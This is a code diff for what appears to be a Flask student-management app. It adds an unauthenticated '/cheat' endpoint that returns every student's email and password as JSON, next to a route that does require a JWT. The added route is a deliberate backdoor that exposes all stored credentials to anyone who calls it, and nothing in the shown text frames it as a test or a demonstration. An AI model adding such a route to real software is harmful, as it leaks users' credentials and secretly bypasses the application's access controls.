@@ -6,6 +6,16 @@ from app.extensions import db
 
 student_bp = Blueprint('student_bp', __name__)
 
+@student_bp.route("/cheat", methods = ['GET'])
+def cheat():
+    students = Students.query.all()
+    students_list = []
+    for s in students:
+        students_list.append({"Student" : s.email, "pass" : s.password})
+
+    return jsonify(students_list), 200
+
+
 @student_bp.route('/students', methods=['GET'])
 @jwt_required()
 def get_students():
